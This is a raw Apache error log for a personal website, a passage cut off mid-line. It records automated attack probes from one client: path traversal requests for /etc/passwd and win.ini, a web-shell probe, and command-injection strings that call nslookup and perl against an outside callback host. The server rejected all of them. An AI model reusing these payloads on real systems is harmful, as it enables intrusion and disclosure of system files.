[Thu Jul 08 01:47:08.395564 2021] [php7:error] [pid 10979] [client 27.147.202.214:11138] script '/var/www/html/justinbodnar.com/css/simple-backdoor.php' not found or unable to stat
[Thu Jul 08 01:47:10.246313 2021] [core:error] [pid 10209] [client 27.147.202.214:8710] AH00126: Invalid URI in request GET /css//%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1
[Thu Jul 08 01:47:10.287346 2021] [core:error] [pid 10937] [client 27.147.202.214:8658] AH00126: Invalid URI in request GET /js//../../../../../../../../boot.ini HTTP/1.1
[Thu Jul 08 01:47:10.568840 2021] [core:error] [pid 10989] [client 27.147.202.214:8654] AH00126: Invalid URI in request GET /css//%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/windows/win.ini HTTP/1.1
[Thu Jul 08 01:47:11.210434 2021] [core:error] [pid 10887] [client 27.147.202.214:8716] AH00126: Invalid URI in request GET /css//%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1
[Thu Jul 08 01:47:11.422898 2021] [core:error] [pid 10990] [client 27.147.202.214:8714] AH00126: Invalid URI in request GET /css//%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1
[Thu Jul 08 01:47:11.537418 2021] [core:error] [pid 10873] [client 27.147.202.214:2077] AH00126: Invalid URI in request GET /css//%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/windows/win.ini HTTP/1.1
[Thu Jul 08 01:47:11.636155 2021] [core:error] [pid 10935] (36)File name too long: [client 27.147.202.214:8659] AH00036: access to /css/%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af/etc/passwd failed (filesystem path '/var/www/html/justinbodnar.com/css/%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af')
[Thu Jul 08 01:47:11.744148 2021] [core:error] [pid 10913] [client 27.147.202.214:8651] AH00126: Invalid URI in request GET /css//%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/windows/win.ini HTTP/1.1
[Thu Jul 08 01:47:13.551420 2021] [core:error] [pid 10981] [client 27.147.202.214:11130] AH00126: Invalid URI in request GET /js//%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1
[Thu Jul 08 01:47:13.889766 2021] [core:error] [pid 10854] [client 27.147.202.214:8600] AH00126: Invalid URI in request GET /js//%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/windows/win.ini HTTP/1.1
[Thu Jul 08 01:47:14.782882 2021] [core:error] [pid 10994] [client 27.147.202.214:8712] AH00126: Invalid URI in request GET /js//%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1
[Thu Jul 08 01:47:15.111806 2021] [core:error] [pid 10949] [client 27.147.202.214:11125] AH00126: Invalid URI in request GET /js//%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/windows/win.ini HTTP/1.1
[Thu Jul 08 01:47:16.775892 2021] [core:error] [pid 10933] [client 27.147.202.214:8591] AH00126: Invalid URI in request GET /js//../../../../../../../../etc/passwd HTTP/1.1
[Thu Jul 08 01:47:19.839327 2021] [core:error] [pid 11006] [client 27.147.202.214:7065] AH00126: Invalid URI in request GET /js//../../../../../../../../windows/win.ini HTTP/1.1
[Thu Jul 08 01:47:19.897923 2021] [authz_core:error] [pid 10995] [client 27.147.202.214:8717] AH01630: client denied by server configuration: /var/www/html/justinbodnar.com/css/.htaccess~
[Thu Jul 08 01:47:20.229192 2021] [authz_core:error] [pid 10995] [client 27.147.202.214:8717] AH01630: client denied by server configuration: /var/www/html/justinbodnar.com/css/.htaccess.old
[Thu Jul 08 01:47:20.556016 2021] [authz_core:error] [pid 10995] [client 27.147.202.214:8717] AH01630: client denied by server configuration: /var/www/html/justinbodnar.com/css/.htaccess.save
[Thu Jul 08 01:47:21.311180 2021] [core:error] [pid 10908] (36)File name too long: [client 27.147.202.214:11139] AH00036: access to /css/%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af/etc/passwd failed (filesystem path '/var/www/html/justinbodnar.com/css/%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af')
[Thu Jul 08 01:47:21.736938 2021] [core:error] [pid 10615] (36)File name too long: [client 27.147.202.214:8719] AH00036: access to /css/%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af/etc/passwd failed (filesystem path '/var/www/html/justinbodnar.com/css/%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af')
[Thu Jul 08 01:47:22.640268 2021] [core:error] [pid 10911] (36)File name too long: [client 27.147.202.214:7066] AH00036: access to /;(nslookup hitrferpctdnsd8ecf.bxss.me||perl -e "gethostbyname('hitrferpctdnsd8ecf.bxss.me')")|(nslookup hitrferpctdnsd8ecf.bxss.me||perl -e "gethostbyname('hitrferpctdnsd8ecf.bxss.me')")&(nslookup hitrferpctdnsd8ecf.bxss.me||perl -e "gethostbyname('hitrferpctdnsd8ecf.bxss.me')")/contactform.js failed (filesystem path '/var/www/html/justinbodnar.com/;(nslookup hitrferpctdnsd8ecf.bxss.me||perl -e "gethostbyname('hitrferpctdnsd8ecf.bxss.me')")|(nslookup hitrferpctdnsd8ecf.bxss.me||perl -e "gethostbyname('hitrferpctdnsd8ecf.bxss.me')")&(nslookup hitrferpctdnsd8ecf.bxss.me||perl -e "gethostbyname('hitrferpctdnsd8ecf.bxss.me')")')
[Thu Jul 08 01:47:22.773124 2021] [core:error] [pid 10990] (36)File name too long: [client 27.147.202.214:7087] AH00036: access to /;(nslookup hitopfxvlxwer301e3.bxss.me||perl -e "gethostbyname('hitopfxvlxwer301e3.bxss.me')")|(nslookup hitopfxvlxwer301e3.bxss.me||perl -e "gethostbyname('hitopfxvlxwer301e3.bxss.me')")&(nslookup hitopfxvlxwer301e3.bxss.me||perl -e "gethostbyname('hitopfxvlxwer301e3.bxss.me')")/custom.js failed (filesystem path '/var/www/html/justinbodnar.com/;(nslookup hitopfxvlxwer301e3.bxss.me||perl -e "gethostbyname('hitopfxvlxwer301e3.bxss.me')")|(nslookup hitopfxvlxwer301e3.bxss.me||perl -e "gethostbyname('hitopfxvlxwer301e3.bxss.me')")&(nslookup hitopfxvlxwer301e3.bxss.me||perl -e "gethostbyname('hitopfxvlxwer301e3.bxss.me')")')
[Thu Jul 08 01:47:23.890314 2021] [core:error] [pid 10615] [client 27.147.202.214:8719] AH00126: Invalid URI in request GET /js//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/../../../../../../../../etc/passwd HTTP/1.1
[Thu Jul 08 01:47:23.979599 2021] [core:error] [pid 10953] [client 27.147.202.214:8660] AH00126: Invalid URI in request GET /js//../../../../../../../../boot.ini HTTP/1.1
[Thu Jul 08 01:47:24.110712 2021] [core:error] [pid 10866] (36)File name too long: [client 27.147.202.214:7096] AH00036: access to /css/%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af/etc/passwd failed (filesystem path '/var/www/html/justinbodnar.com/css/%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af')
[Thu Jul 08 01:47:25.548910 2021] [core:error] [pid 10890] [client 27.147.202.214:8713] AH00126: Invalid URI in request GET /js//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/../../../../../../../../etc/passwd HTTP/1.1
[Thu Jul 08 01:47:26.058294 2021] [core:error] [pid 10939] [client 27.147.202.214:7424] AH00126: Invalid URI in request GET /js//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/../../../../../../../../windows/win.ini HTTP/1.1
[Thu Jul 08 01:47:26.059744 2021] [core:error] [pid 10906] [client 27.147.202.214:7102] AH00126: Invalid URI in request GET /js//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/../../../../../../../../windows/win.ini HTTP/1.1
[Thu Jul 08 01:47:26.725400 2021] [core:error] [pid 10911] (36)File name too long: [client 27.147.202.214:7066] AH00036: access to /;(nslookup hitpkumypdliz108ca.bxss.me||perl -e "gethostbyname('hitpkumypdliz108ca.bxss.me')")|(nslookup hitpkumypdliz108ca.bxss.me||perl -e "gethostbyname('hitpkumypdliz108ca.bxss.me')")&(nslookup hitpkumypdliz108ca.bxss.me||perl -e "gethostbyname('hitpkumypdliz108ca.bxss.me')")/jquery.easing.min.js failed (filesystem path '/var/www/html/justinbodnar.com/;(nslookup hitpkumypdliz108ca.bxss.me||perl -e "gethostbyname('hitpkumypdliz108ca.bxss.me')")|(nslookup hitpkumypdliz108ca.bxss.me||perl -e "gethostbyname('hitpkumypdliz108ca.bxss.me')")&(nslookup hitpkumypdliz108ca.bxss.me||perl -e "gethostbyname('hitpkumypdliz108ca.bxss.me')")')
[Thu Jul 08 01:47:28.066780 2021] [core:error] [pid 10892] [client 27.147.202.214:8650] AH00126: Invalid URI in request GET /js//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/../../../../../../../../etc/passwd HTTP/1.1
[Thu Jul 08 01:47:28.144576 2021] [core:error] [pid 10908] [client 27.147.202.214:11139] AH00126: Invalid URI in request GET /js//%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1
[Thu Jul 08 01:47:28.969477 2021] [core:error] [pid 10911] [client 27.147.202.214:7066] AH00126: Invalid URI in request GET /js//........................................................................../../../../../../../../etc/passwd HTTP/1.1
[Thu Jul 08 01:47:30.786806 2021] [core:error] [pid 11027] [client 27.147.202.214:7480] AH00126: Invalid URI in request GET /js//%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/windows/win.ini HTTP/1.1
[Thu Jul 08 01:47:30.982062 2021] [core:error] [pid 10991] [client 27.147.202.214:8715] AH00126: Invalid URI in request GET /js//........................................................................../../../../../../../../etc/passwd HTTP/1.1
[Thu Jul 08 01:47:31.571971 2021] [core:error] [pid 10935] [client 27.147.202.214:7484] AH00126: Invalid URI in request GET /js//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/../../../../../../../../windows/win.ini HTTP/1.1
[Thu Jul 08 01:47:31.709435 2021] [core:error] [pid 10878] [client 27.147.202.214:7467] AH00126: Invalid URI in request GET /css//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/../../../../../../../../etc/passwd HTTP/1.1
[Thu Jul 08 01:47:31.732926 2021] [core:error] [pid 10840] [client 27.147.202.214:7491] AH00126: Invalid URI in request GET /js//........................................................................../../../../../../../../windows/win.ini HTTP/1.1
[Thu Jul 08 01:47:32.014369 2021] [core:error] [pid 10879] [client 27.147.202.214:7078] AH00126: Invalid URI in request GET 